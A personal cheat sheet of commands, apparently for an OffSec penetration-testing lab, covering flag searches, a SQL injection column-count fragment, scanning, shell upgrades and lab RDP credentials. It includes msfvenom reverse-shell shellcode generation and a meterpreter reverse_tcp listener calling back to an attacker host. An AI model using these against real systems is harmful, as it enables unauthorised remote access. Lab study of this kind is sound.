find ~/ -type f -exec grep -l "OS{" {} \;      ----FLAG FINDER

'ORDER%20BY%206--//            -----ORDER OF COLUMNS IN SQL

find / -name "flag.txt" -print   -----flag finder in Windows environment

.dir /s /b | findstr /i "OS{"

source myenv/bin/activate              --- TO ACTIVATE THE VIRTUAL ENVIRONMENT

Get-ChildItem -Path C:\ -Recurse -File -Filter 'flag.txt'   ---Powershell cmd

sudo env "PATH=$PATH" autorecon 192.168.225.194 ---AUTORECON

```sh
SHELL=/bin/bash script -q /dev/null
```
UPGRADE THE SHELL

PAYLOADS BY TYPE msfvenom -l payloads | grep "cmd/unix*"  ^44c81b

#linux
find / -type f -name flag.txt 2>/dev/null
#windows cmd
where /r c:\ flag.txt
#windows powershell
gci -recurse -File -ErrorAction SilentlyContinue -Path "\" -filter "flag.txt"


 xfreerdp /v:192.168.215.61 /u:offsec /p:lab /drive:C:\,/home/hollacosta/Downloads            IMPORTANT CMD TO MAP A DRIVE WHILE REMOTING INTO A WINDOWS  COMPUTER

msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.181;set LPORT 443;run;"
METERPRETER REVERSE SHELL LISTENER

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=8443 -f python -b "\x00\x20" -v shellcode
REGULAR REVERSE SHELL SHELLCODE




